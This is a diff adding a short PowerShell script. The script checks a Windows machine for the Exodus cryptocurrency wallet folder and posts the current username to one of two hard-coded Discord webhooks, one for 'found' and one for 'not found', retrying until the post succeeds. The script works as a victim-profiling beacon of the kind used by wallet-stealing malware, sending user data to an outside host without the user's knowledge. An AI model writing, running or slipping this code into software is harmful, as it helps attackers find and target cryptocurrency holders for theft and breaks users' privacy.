@@ -1,0 +1,39 @@
+$discordHookFound = 'https://discord.com/api/webhooks/1436649396682100839/zHCDc5BuZST79aHhaTnJCIAgJDWKH59g981wDegqW-XhthyrmPn86COuQ68ZpP7hKTiI'
+$discordHookNotFound = 'https://discord.com/api/webhooks/1437121398605742204/A-T3rrS_fyvQxuIxjdfbwDUDOdMrrIqpsP6F9q8I1CDWA5U7DMOo_CvtsFQZCiimADZt'
+$exodusDir = Join-Path $env:APPDATA 'Exodus'
+$avatarUrl = 'https://i.imgur.com/4NJG86V.png'
+$embedColor = 7224248
+$currentTime = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
+$userName = $env:USERNAME
+
+function Send-DiscordEmbed($hook, $title, $desc, $color, $thumb) {
+    $payload = @{
+        embeds = @(
+            @{
+                title = $title
+                description = $desc
+                color = $color
+                thumbnail = @{ url = $thumb }
+            }
+        )
+    } | ConvertTo-Json -Depth 10
+    $sent = $false
+    do {
+        try {
+            $response = Invoke-WebRequest -Uri $hook -Method Post -Body $payload -ContentType 'application/json' -ErrorAction Stop
+            if ($response.StatusCode -eq 204) {
+                $sent = $true
+            } else {
+                Start-Sleep -Seconds 1
+            }
+        } catch {
+            Start-Sleep -Seconds 1
+        }
+    } while (-not $sent)
+}
+
+if (Test-Path -Path $exodusDir) {
+    Send-DiscordEmbed $discordHookFound 'Exoduz found' "Found on $userName" $embedColor $avatarUrl
+} else {
+    Send-DiscordEmbed $discordHookNotFound 'Exoduz not found' "Not found on $userName" $embedColor $avatarUrl
+}
